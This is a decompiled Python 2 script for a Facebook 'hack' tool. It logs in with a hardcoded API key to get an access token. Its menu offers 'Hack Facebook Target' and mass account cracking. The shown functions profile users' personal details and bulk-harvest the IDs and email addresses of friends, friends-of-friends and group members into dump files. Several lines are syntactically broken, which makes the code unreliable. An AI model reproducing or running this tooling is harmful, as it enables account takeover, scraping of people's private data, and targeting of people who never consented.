# uncompyle6 version 3.3.5
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Aug  6 2019, 01:11:15) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: dg
merah = '\x1b[1;90m'
lime = '\x1b[1;90m'
kuning = '\x1b[1;90m'
biru = '\x1b[1;90m'
ungu = '\x1b[1;90m'
blue = '\x1b[1;90m'
putih = '\x1b[1;90m'
tutup = '\x1b[0m'
try:
    import os, sys, time, random, hashlib, re, threading, json, urllib, requests, mechanize, urllib, cookielib, marshal, zlib, base64
    from multiprocessing.pool import ThreadPool
    from bs4 import BeautifulSoup as sup
except Exception as modul:
    exit(tutup + '\033[37;1m[' + merah + '\033[31;1m!' + tutup + '\033[37;1m] Module Error : ' + str(modul))

reload(sys)
sys.setdefaultencoding('utf8')
sex = mechanize.Browser()
apa = requests.Session()
sex.set_handle_robots(False)
sex.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
sex.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
at = 'acil.SEAN'
idfriend = []
idfromfriend = []
idmem = []
emteman = []
emfromfriend = []
emmem = []
nofriend = []
nofromfriend = []
nomem = []
berhasil = []
checkpoint = []
gagal = []
back = 0
threads = []
auto_total = []
auto_ok = []
auto_cp = []
auto_run = []

def login():
    try:
        token = open('logs.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print ("""     __  __      ____                  _
    |  \/  |_ __| __ )  __ _  ___ ___ | |_                     | |\/| | __|  _ \ / _` |/ __/ _ \| __|                     | |  | | | _| |_) | (_| | (_| (_) | |_                     |_|  |_|_|(_)____/ \__,_|\___\___/ \__|                ---------------------------------------------                             [ TOOLS INFO ]
Author  : Mr.Bacot
Support : Mr.Lonte
Name    : PePek Anjink
Version : v1.9
---------------------------------------------""" )
        print tutup + '\n[' + putih + '\033[36;1m+' + tutup + '\033[37;1m] LOGIN ACCOUNT FACEBOOK ' + tutup + '[' + putih + '\033[36;1m+' + tutup + '\033[37;1m]' + tutup
        usr = raw_input(tutup + '\033[37;1m[' + putih + '\033[33;1m+' + tutup + '\033[37;1m] Username :\033[32;1m ' + biru)
        pwd = raw_input(tutup + '\033[37;1m[' + putih + '\033[33;1m+' + tutup + '\033[37;1m] Password :\033[32;1m ' + biru)
        try:
            sex.open('https://m.facebook.com')
        except mechanize.URLError:
            exit(tutup + '\033[37;1m[' + hijau + '\033[31;1m!' + tutup + '\033[37;1m] Koneksi Error')

        sex._factory.is_html = True
        sex.select_form(nr=0)
        sex.form['email'] = usr
        sex.form['pass'] = pwd
        sex.submit()
        ambil = sex.geturl()
        if 'save-device' in ambil:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + usr + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': usr, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                a = requests.get(url, params=data)
                b = json.loads(a.text)
                my = open('logs.txt', 'w')
                my.write(b['access_token'])
                my.close()
                print tutup + '\033[37;1m[' + ungu + '\033[36;1m+' + tutup + '\033[37;1m] Login berhasil'
                os.system('xdg-open https://www.youtube.com/channel/UCNHfHIJcNiZ-vGK389OOhDA')
                menu()
            except requests.exceptions.ConnectionError:
                exit(tutup + '\033[37;1m[' + merah + '\033[31;1m!' + tutup + '\033[37;1m] Koneksi Error')

        elif 'checkpoint' in ambil:
            os.system('rm -rf logs.txt')
            exit(tutup + '\033[37;1m[' + kuning + '\033[33;1m!' + tutup + '\033[37;1m] Checkpoint')
        else:
            os.system('rm -rf logs.txt')
            exit(tutup + '\033[37;1m[' + merah + '\033[31;1m!' + tutup + '\033[37;1m] Username atau Password\033[31;1m Salah')



def menu():
    try:
        token = open('logs.txt').read()
        cek = requests.get('https://graph.facebook.com/me?access_token=' + token)
        a = json.loads(cek.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        print tutup + '\033[37;1m[' + kuning + '\033[33;1m!' + tutup + '\033[37;1m] Checkpoint'
        os.system('rm -rf logs.txt')
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m!' + tutup + '\033[37;1m] Exit' + tutup)
    except requests.exceptions.ConnectionError:
        exit(merah + '[!] No Connection')    
    os.system('clear')
    print ("""     __  __      ____                  _
    |  \/  |_ __| __ )  __ _  ___ ___ | |_                     | |\/| | __|  _ \ / _` |/ __/ _ \| __|                     | |  | | | _| |_) | (_| | (_| (_) | |_                     |_|  |_|_|(_)____/ \__,_|\___\___/ \__|                ---------------------------------------------                             [ TOOLS INFO ]
Author  : Mr.Bacot
Support : Mr.Lonte
Name    : PePek Anjink
Version : v1.9
---------------------------------------------""" )
    print
    print tutup + '\033[37;1m[' + putih + '\033[32;1m#' + tutup + '\033[37;1m] User : ' + nama + tutup
    print
    print tutup + '\033[37;1m[' + putih + '\033[31;1m01' + tutup + '\033[37;1m] Informasi Account Facebook'
    print tutup + '\033[37;1m[' + putih + '\033[31;1m02' + tutup + '\033[37;1m] Dapatkan ID/Gmail/Nope'
    print tutup + '\033[37;1m[' + putih + '\033[31;1m03' + tutup + '\033[37;1m] Hack Facebook Target [\033[31;1m Work\033[37;1m ]'
    print tutup + '\033[37;1m[' + putih + '\033[31;1m04' + tutup + '\033[37;1m] BoT'
    print tutup + '\033[37;1m[' + putih + '\033[31;1m05' + tutup + '\033[37;1m] Lihat Status'
    print tutup + '\033[37;1m[' + putih + '\033[31;1m06' + tutup + '\033[37;1m] Profile Guard'
    print tutup + '\033[37;1m[' + putih + '\033[31;1m07' + tutup + '\033[37;1m] Group List'
    print tutup + '\033[37;1m[' + putih + '\033[31;1m08' + tutup + '\033[37;1m] Big Crack Akun Facebook'
    print tutup + '\033[37;1m[' + putih + '\033[31;1m09' + tutup + '\033[37;1m] Chek Akun Yang Terkait di Apps'
    print tutup + '\033[37;1m[' + putih + '\033[31;1m10' + tutup + '\033[37;1m] Hapus Token'
    print tutup + '\033[37;1m[' + putih + '\033[31;1m11' + tutup + '\033[37;1m] Info Tools'
    print tutup + '\033[37;1m[' + putih + '\033[31;1m00' + tutup + '\033[37;1m] Exit'
    print
    mana = raw_input(tutup + '[' + putih + '\033[31;1mSelection' + tutup + ']> ' + lime)
    if mana == '':
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m!' + tutup + '\033[37;1m] Exit' + tutup)
    elif mana in ('1', '01'):
        informasi()
    elif mana in ('2', '02'):
        dump()
    elif mana in ('3', '03'):
        hack()
    elif mana in ('4', '04'):
        bot()
    elif mana in ('5', '05'):
        status()
    elif mana in ('6', '06'):
        guard()
    elif mana in ('7', '07'):
       lgrup()
    elif mana in ('8', '08'):
        acek()
    elif mana in ('9', '09'):
        acekpp()
    elif mana in ('10', ):
        os.remove('logs.txt')
        exit(tutup + '\033[37;1m[' + lime + '\033[31;1m!' + tutup + '\033[37;1m] Berhasil menghapus access token')
    elif mana in ('11', ):
        infotools()
    elif mana in ('0', '00'):
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m!' + tutup + '\033[37;1m] Exit' + tutup)
    else:
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m!' + tutup + '\033[37;1m] Exit' + tutup)

def informasi():
    try:
       token = open('logs.txt').read()
    except:
        print('\033[37;1m[\033[31;1m*\033[37;1m] Token Tidak Ada')
    print
    id = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Search Name or ID :\033[32;1m ' + lime)
    if id == '':
        print tutup + '\033[37;1m[' + merah + '\033[31;1m!' + tutup + '\033[37;1m] Masukkan' + tutup
        raw_input(tutup + '\nBack ...')
        menu()
    print tutup + '\033[37;1m[' + lime + '\033[31;1m*' + tutup + '\033[37;1m] Searching ...'
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
    q = json.loads(r.text)
    for i in q['data']:
        if id in i['name'] or id in i['id']:
            a = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
            b = json.loads(a.text)
            print
            try:
                print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Name : ' + lime + b['name']
            except KeyError:
                pass
            else:
                try:
                    print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] First name : ' + lime + b['first_name']
                except KeyError:
                    pass
                else:
                    try:
                        print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Middle name : ' + lime + b['middle_name']
                    except KeyError:
                        pass
                    else:
                        try:
                            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Last name : ' + lime + b['last_name']
                        except KeyError:
                            pass
                        else:
                            try:
                                print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] ID : ' + lime + b['id']
                            except KeyError:
                                pass
                            else:
                                try:
                                    print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Username : ' + lime + b['username']
                                except KeyError:
                                    pass
                                else:
                                    try:
                                        print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Email : ' + lime + b['email']
                                    except KeyError:
                                        pass
                                    else:
                                        try:
                                            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Mobile phone : ' + lime + b['mobile_phone']
                                        except KeyError:
                                            pass
                                        else:
                                            try:
                                                print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Locale : ' + lime + b['locale'].split('_')[0]
                                            except KeyError:
                                                pass
                                            else:
                                                try:
                                                    print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Location : ' + lime + b['location']['name']
                                                except KeyError:
                                                    pass
                                                else:
                                                    try:
                                                        print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Hometown : ' + lime + b['hometown']['name']
                                                    except KeyError:
                                                        pass
                                                    else:
                                                        try:
                                                            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Gender : ' + lime + b['gender']
                                                        except KeyError:
                                                            pass

                                                    try:
                                                        print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Religion : ' + lime + b['religion']
                                                    except KeyError:
                                                        pass

                                                try:
                                                    print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Political : ' + lime + b['political']
                                                except KeyError:
                                                    pass

                                            try:
                                                print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Work : '
                                                for i in b['work']:
                                                    try:
                                                        print tutup + '     ' + lime + '-' + tutup + ' Position : ' + lime + i['position']['name']
                                                    except KeyError:
                                                        pass
                                                    else:
                                                        try:
                                                            print tutup + '     ' + lime + '-' + tutup + ' Employer : ' + lime + i['employer']['name']
                                                        except KeyError:
                                                            pass
                                                        else:
                                                            try:
                                                                if i['start_date'] == '0000-00':
                                                                    print tutup + '     ' + lime + '-' + tutup + ' Start date : ' + lime + '---'
                                                                else:
                                                                    print tutup + '     ' + lime + '-' + tutup + ' Start date : ' + lime + i['start_date']
                                                            except KeyError:
                                                                pass

                                                            try:
                                                                if i['end_date'] == '0000-00':
                                                                    print tutup + '     ' + lime + '-' + tutup + ' End date : ' + lime + '---'
                                                                else:
                                                                    print tutup + '     ' + lime + '-' + tutup + ' End date : ' + lime + i['end_date']
                                                            except KeyError:
                                                                pass

                                                        try:
                                                            print tutup + '     ' + lime + '-' + tutup + ' Location : ' + lime + i['location']['name']
                                                        except KeyError:
                                                            pass

                                            except KeyError:
                                                pass

                                        try:
                                            print tutup + '[' + lime + '+' + tutup + '] Updated time : ' + lime + b['updated_time'][:10] + ' ' + b['updated_time'][11:19]
                                        except KeyError:
                                            pass

                                    try:
                                        print tutup + '[' + lime + '+' + tutup + '] Languages :'
                                        for i in b['languages']:
                                            try:
                                                print tutup + '     ' + lime + '-' + tutup + ' Languages : ' + lime + i['name']
                                            except KeyError:
                                                pass

                                    except KeyError:
                                        pass

                                try:
                                    print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Bio : ' + lime + b['bio']
                                except KeyError:
                                    pass

                            try:
                                print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Quotes : ' + lime + b['quotes']
                            except KeyError:
                                pass

                        try:
                            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Birthday : ' + lime + b['birthday'].replace('/', '-')
                        except KeyError:
                            pass

                    try:
                        print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Link : ' + lime + b['link']
                    except KeyError:
                        pass

                try:
                    print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] School :'
                    for i in b['education']:
                        try:
                            print tutup + '     ' + lime + '-' + tutup + ' School : ' + lime + i['name']
                        except KeyError:
                            pass

                except KeyError:
                    pass

            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Done'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
    else:
        print tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Not Found'
        raw_input(tutup + '\nEnter returns to the menu ...')
        menu()


def dump():
    try:
       token = open('logs.txt').read()
    except:
        print('\033[37;1m[\033[31;1m*\033[37;1m] Token Tidak Ada')
    print
    print tutup + '\033[37;1m[' + lime + '\033[31;1m01' + tutup + '\033[37;1m] Get id friend'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m02' + tutup + '\033[37;1m] Get id friend from friend'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m03' + tutup + '\033[37;1m] Get id member group'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m04' + tutup + '\033[37;1m] Get email friend'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m05' + tutup + '\033[37;1m] Get email friend from friend'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m06' + tutup + '\033[37;1m] Get email member group'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m07' + tutup + '\033[37;1m] Get number phone friend'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m08' + tutup + '\033[37;1m] Get number phone from friend'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m09' + tutup + '\033[37;1m] Get number phone member group'
    print tutup + '\033[37;1m' + merah + '\033[31;1m00' + tutup + '\033[37;1m] Back'
    print
    mana_dump = raw_input(tutup + '[' + lime + '\033[31;1mSelection' + tutup + ']> ' + lime)
    if mana_dump == '':
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)
    elif mana_dump in ('1', '01'):
        id_teman()
    elif mana_dump in ('2', '02'):
        id_dariteman()
    elif mana_dump in ('3', '03'):
        id_member()
    elif mana_dump in ('4', '04'):
        em_teman()
    elif mana_dump in ('5', '05'):
        em_dariteman()
    elif mana_dump in ('6', '06'):
        em_member()
    elif mana_dump in ('7', '07'):
        no_teman()
    elif mana_dump in ('8', '08'):
        no_dariteman()
    elif mana_dump in ('9', '09'):
        no_member()
    elif mana_dump in ('0', '00'):
        menu()
    else:
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Exit' + tutup)

def id_teman():
    try:
        token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError:
        pass
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
    z = json.loads(r.text)
    print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Fetching id all friend ...' + tutup
    save = open('dump/id_teman.txt', 'w')
    for y in z['data']:
        idfriend.append(y['id'])
        save.write(y['id'] + '\n')
        print tutup + '\r[' + lime + '\033[33;1m+' + tutup + '] Total : ' + lime + str(len(idfriend)),
        save.flush()
        time.sleep(0.0001)

    save.close()
    print tutup + '\n[' + lime + '\033[33;1m+' + tutup + '] Successfully get id friend'
    done = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Save file with name : ' + lime)
    print tutup + '\033[37;1m[' + lime + '\033[32;1m+' + tutup + '\033[37;1m] Create file ...'
    time.sleep(2)
    os.rename('dump/id_teman.txt', 'dump/' + done)
    print tutup + '\033[37;1m[' + lime + '\033[32;1m+' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/' + done + tutup
    print tutup + '\033[37;1m[' + lime + '\033[32;1m+' + tutup + '\033[37;1m] Selesai'
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


def id_dariteman():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError:
        pass
    else:
        idt = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Input ID Friend : ' + lime)
        try:
            a = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            f = json.loads(a.text)
            print tutup + '\033[37;1m[' + blue + '\xe2\x9c\x93' + tutup + '\033[37;1m] Get ID From : ' + lime + f['name']
        except KeyError:
            print tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Not Found'
            raw_input(tutup + '\nEnter returns to the menu ...')
        menu()
    r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + token)
    z = json.loads(r.text)
    print tutup + '\033[37;1m[' + lime + '\032[33;1m+' + tutup + '\033[37;1m] Fetching id all friend from ' + lime + f['name'] + tutup
    save = open('dump/id_temandariteman.txt', 'w')
    for y in z['friends']['data']:
        idfromfriend.append(y['id'])
        save.write(y['id'] + '\n')
        print tutup + '\r[' + lime + '\033[33;1m*' + tutup + '] Total : ' + lime + str(len(idfromfriend)),
        save.flush()
        time.sleep(0.0001)

    save.close()
    print tutup + '\n\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Successfully get id friend from ' + lime + f['name'] + tutup
    done = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Save file with name : ' + lime)
    print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Create file ...'
    time.sleep(2)
    os.rename('dump/id_temandariteman.txt', 'dump/' + done)
    print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/' + done + tutup
    print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Selesai'
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


def id_member():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError:
        pass
    else:
        idg = raw_input(tutup + '[' + lime + '+' + tutup + '] Input ID Group : ' + lime)
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + token)
            s = json.loads(r.text)
            print tutup + '\033[37;1m[' + blue + '\xe2\x9c\x93' + tutup + '\033[37;1m] Name Group : ' + lime + s['name'] + tutup
        except KeyError:
            print tutup + '\033[37;1m[' + merah + '*' + tutup + '\033[37;1m] Group Not Found'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()

        try:
            print tutup + '\033[37;1m[' + lime + '\033[31;1m*' + tutup + '\033[37;1m] Fetching id from member group ...' + tutup
            save = open('dump/id_member.txt', 'w')

            def lanjut(urlz):
                u = requests.get(urlz)
                hasil = json.loads(u.text)
                halaman = hasil['paging']
                for z in hasil['data']:
                    idmem.append(z['id'])
                    save.write(z['id'] + '\n')
                    print tutup + '\r\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Total : ' + str(len(idmem)),
                    sys.stdout.flush
                    time.sleep(0.0001)

                if halaman.get('next') is not None:
                    lanjut(halaman.get('next'))
                return


            def ambil():
                r = requests.get('https://graph.facebook.com/' + idg + '/members?fileds=id&limit=5000&summary=true&access_token=' + token)
                hasil = json.loads(r.text)
                halaman = hasil['paging']
                for z in hasil['data']:
                    idmem.append(z['id'])
                    save.write(z['id'] + '\n')

                if halaman.get('next') is not None:
                    lanjut(halaman.get('next'))
                return


            ambil()
            save.close()
            print tutup + '\n\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Successfully get id from member group'
            done = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Save file with name : ' + lime)
            print tutup + '[' + lime + '+' + tutup + '] Create file ...'
            time.sleep(2)
            os.rename('dump/id_member.txt', 'dump/' + done)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Selesai'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except (KeyboardInterrupt, IOError, EOFError, KeyError):
            save.close()
            print tutup + '\n\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/id_member.txt' + tutup
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Selesai'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except requests.exceptions.ConnectionError:
            save.close()
            print tutup + '\n\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/id_member.txt' + tutup
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Selesai'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()


def em_teman():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError:
        pass
    else:
        try:
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
            a = json.loads(r.text)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Fetching email all friend ...' + tutup
            save = open('dump/em_teman.txt', 'w')
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
                z = json.loads(x.text)
                try:
                    emteman.append(z['email'])
                    save.write(z['email'] + '\n')
                    print tutup + '\r\033[37;1m[ ' + lime + str(len(emteman)) + tutup + ' \033[37;1m] ' + z['email'] + ' | ' + z['name'] + '\n',
                    sys.stdout.flush()
                    time.sleep(0.0001)
                except KeyError:
                    pass

            save.close()
            print tutup + '\n\033[37;1m[' + lime + '\033[32;1m+' + tutup + '\033[37;1m] Successfully get email friend'
            done = raw_input(tutup + '\033[37;1m[' + lime + '\033[32;1m+' + tutup + '\033[37;1m] Save file with name : '
            print tutup + '\033[37;1m[' + lime + '\033[32;1m+' + tutup + '\033[37;1m] Create file ...'
            time.sleep(2)
            os.rename('dump/em_teman.txt', 'dump/' + done)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Selesai'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except KeyboardInterrupt:
            save.close()
            print tutup + '\n\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Successfully get email friend'
            done = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Save file with name : '
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Create file ...'
            time.sleep(2)
            os.rename('dump/em_teman.txt', 'dump/' + done)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Selesai'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()


def em_dariteman():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError:
        pass
    else:
        idt = raw_input(tutup + '\033[37;1m[' + lime + '\033[31;1m+' + tutup + '\033[37;1m] Input ID Friend : '
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            p = json.loads(r.text)
            print tutup + '\033[37;1m[' + blue + '\xe2\x9c\x93' + tutup + '\033[37;1m] Get Email From : ' + lime + p['name']
        except KeyError:
            print tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Not Found'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()

        try:
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
            a = json.loads(r.text)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Fetching email all friend from ' + lime + p['name'] + tutup
            save = open('dump/em_dariteman.txt', 'w')
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
                z = json.loads(x.text)
                try:
                    emfromfriend.append(z['email'])
                    save.write(z['email'] + '\n')
                    print tutup + '\r\033[37;1m[ ' + lime + str(len(emfromfriend)) + tutup + ' \033[37;1m] ' + z['email'] + ' | ' + z['name'] + '\n',
                    sys.stdout.flush()
                    time.sleep(0.0001)
                except KeyError:
                    pass

            save.close()
            print tutup + '\n[' + lime + '+' + tutup + '] Successfully get email friend from ' + lime + p['name'] + tutup
            done = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Save file with name : ' + lime)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Create file ...'
            time.sleep(2)
            os.rename('dump/em_dariteman.txt', 'dump/' + done)
            print tutup + '\033[37;1m[' + lime + '\033[37;1m+' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Selesai'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except KeyboardInterrupt:
            save.close()
            print tutup + '\n\033[37;1m[' + lime + '\033[33;1m✓' + tutup + '\033[37;1m] Successfully get email friend from ' + lime + p['name'] + tutup
            done = raw_input(tutup + '\033[37;1m[' + lime + '\033[31;1m*' + tutup + '\033[37;1m] Save file with name : '
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Create file ...'
            time.sleep(2)
            os.rename('dump/em_dariteman.txt', 'dump/' + done)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Selesai'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()


def em_member():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError:
        pass
    else:
        idg = raw_input(tutup + '\033[37;1m[' + lime + '\033[31;1m*' + tutup + '\033[37;1m] Input ID Group : '
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + token)
            s = json.loads(r.text)
            print tutup + '\033[37;1m[' + blue + '\xe2\x9c\x93' + tutup + '\033[37;1m] Name Group : ' + lime + s['name'] + tutup
        except KeyError:
            print tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Group Not Found'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()

        try:
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Fetching email from member group ...' + tutup
            save = open('dump/em_member.txt', 'w')
            p = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + token)
            i = json.loads(p.text)
            for a in i['data']:
                x = requests.get('https://graph.facebook.com/' + a['id'] + '?access_token=' + token)
                z = json.loads(x.text)
                try:
                    emmem.append(z['email'])
                    save.write(z['email'] + '\n')
                    print tutup + '\r\033[37;1m[ ' + lime + str(len(emmem)) + tutup + ' \033[37;1m] ' + z['email'] + ' | ' + z['name'] + '\n',
                    sys.stdout.flush()
                    time.sleep(0.0001)
                except KeyError:
                    pass

            save.close()
            print tutup + '\n\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Successfully get email from member group'
            done = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Save file with name : '
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Create file ...'
            time.sleep(2)
            os.rename('dump/em_member.txt', 'dump/' + done)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Selesai'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except KeyboardInterrupt:
            save.close()
            print tutup + '\n\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Successfully get email from member group'
            done = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Save file with name : '
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Create file ...'
            time.sleep(2)
            os.rename('dump/em_member.txt', 'dump/' + done)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/' + done + tutup
